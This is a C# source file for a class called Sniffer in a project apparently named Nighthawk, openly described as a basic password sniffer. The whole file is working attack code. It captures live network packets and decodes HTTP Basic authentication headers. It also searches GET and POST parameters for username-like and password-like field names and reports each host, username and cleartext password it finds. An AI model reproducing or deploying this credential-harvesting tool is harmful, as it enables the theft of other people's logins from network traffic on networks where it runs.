using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SharpPcap;
using PacketDotNet;
using System.Threading;

namespace Nighthawk
{
    /* Basic password sniffer (currently only HTTP, HTML) */
    public class Sniffer
    {
        // current device
        private LivePcapDevice device;

        // status
        public bool Started = false;

        // exclusion
        private bool excludeLocalIP = false;
        private DeviceInfo deviceInfo;

        // packet queues (packet store for BG thread to work on)
        public List<TcpPacket> PacketQueue = new List<TcpPacket>();
        private List<TcpPacket> threadQueue = new List<TcpPacket>();

        // encoding converter
        private UTF8Encoding encoding = new UTF8Encoding();

        // worker thread
        private Thread worker;

        // events
        public event SnifferResultHandler OnSnifferResult;

        private void Result(string data, SnifferResult type)
        {
            if (data != string.Empty)
            {
                // invoke event
                if (OnSnifferResult != null) OnSnifferResult(data, type);

            }
        }

        // field names - username
        private string[] fieldNamesUser = new string[]
        {
            "user",
            "usr",
            "username",
            "name",
            "email",
            "mail",
            "account",
            "user-name"
        };

        // field names - password
        private string[] fieldNamesPassword = new string[]
        {
            "pass",
            "password",
            "key"
        };

        // constructor
        public Sniffer(LivePcapDevice device)
        {
            // store our network interface
            this.device = device;
        }

        // start sniffer
        public void Start(bool excludeLocalIP, DeviceInfo deviceInfo)
        {
            // set
            this.excludeLocalIP = excludeLocalIP;
            this.deviceInfo = deviceInfo;

            // change status
            Started = true;

            // start a worker thread
            worker = new Thread(new ThreadStart(Worker));
            worker.Name = "Sniffer thread";
            worker.Start();
        }

        // stop sniffer
        public void Stop()
        {
            // change status
            Started = false;

            // stop worker thread
            worker.Abort();
        }
        
        // worker function that actually parses HTTP packets
        public void Worker()
        {
            // loop
            while (Started)
            {
                // copy packets to threadQueue
                lock (PacketQueue)
                {
                    foreach (TcpPacket packet in PacketQueue)
                    {
                        threadQueue.Add(packet);
                    }

                    PacketQueue.Clear();
                }

                if (threadQueue.Count > 0)
                {
                    // loop through packets
                    foreach (TcpPacket packet in threadQueue)
                    {
                        // check for exclusions
                        if (excludeLocalIP)
                        {
                            if ((packet.ParentPacket as IpPacket).SourceAddress.ToString() == deviceInfo.IP || (packet.ParentPacket as IpPacket).DestinationAddress.ToString() == deviceInfo.IP)
                            {
                                continue;
                            }
                        }

                        // parse HTTP packet
                        if (HttpPacket.IsHTTP(packet))
                        {
                            var http = new HttpPacket(packet);

                            // check for any passwords
                            SnifferSearch(http);
                        }
                    }

                    threadQueue.Clear();
                }
                else
                {
                    // some timeout
                    Thread.Sleep(50);
                }
            }
        }

        // credentials search
        public void SnifferSearch(HttpPacket packet)
        {
            var data = string.Empty;

            var user = string.Empty;
            var password = string.Empty;

            // check for 401 authentication
            if(packet.Header.Authorization != string.Empty)
            {
                try
                {
                    // clear out "BASIC"
                    var auth = packet.Header.Authorization.Replace("Basic ", "");

                    // convert from Base64
                    var bytes = Convert.FromBase64String(auth);
                    var credentials = encoding.GetString(bytes);

                    // split user:password
                    var userData = credentials.Split(':');

                    data = "URL: " + packet.Header.Host + " | User: »" + userData[0] + "« | Password: »" + userData[1] +
                            "«";

                    Result(data, SnifferResult.HTTPAuth);
                }
                catch { }
            }

            // if there are any GET params
            if (packet.Header.GetParams.Count > 0)
            {
                foreach (string[] param in packet.Header.GetParams)
                {
                    // check for field names - username
                    if (fieldNamesUser.Where(s => param[0].IndexOf(s) != -1).Count() > 0)
                    {
                        user = param[1];
                    }
                    else if (fieldNamesPassword.Where(s => param[0].IndexOf(s) != -1).Count() > 0)
                    {
                        password = param[1];
                    }
                }

                // create output
                if (user != string.Empty && password != string.Empty)
                {
                    data = "URL: " + packet.Header.Host + " | User: »" + user + "« | Password: »" + password +
                            "« (GET)";

                    Result(data, SnifferResult.HTML);
                }
            }

            // reset values
            user = string.Empty;
            password = string.Empty;

            // if there are any POST params
            if (packet.PostParams.Count > 0)
            {
                foreach (string[] param in packet.PostParams)
                {
                    // check for field names - username
                    if (fieldNamesUser.Where(s => param[0].IndexOf(s) != -1).Count() > 0)
                    {
                        user = param[1];
                    }
                    else if (fieldNamesPassword.Where(s => param[0].IndexOf(s) != -1).Count() > 0)
                    {
                        password = param[1];
                    }
                }

                // create output
                if (user != string.Empty && password != string.Empty)
                {
                    data = "URL: " + packet.Header.Host + " | User: »" + user + "« | Password: »" + password +
                            "« (POST)";

                    Result(data, SnifferResult.HTML);
                }
            }
        }
    }

    // sniffer result enum
    public enum SnifferResult
    {
        HTTPAuth,
        HTML
    }

    // OnSnifferResult event delegate
    public delegate void SnifferResultHandler(string data, SnifferResult type);
}
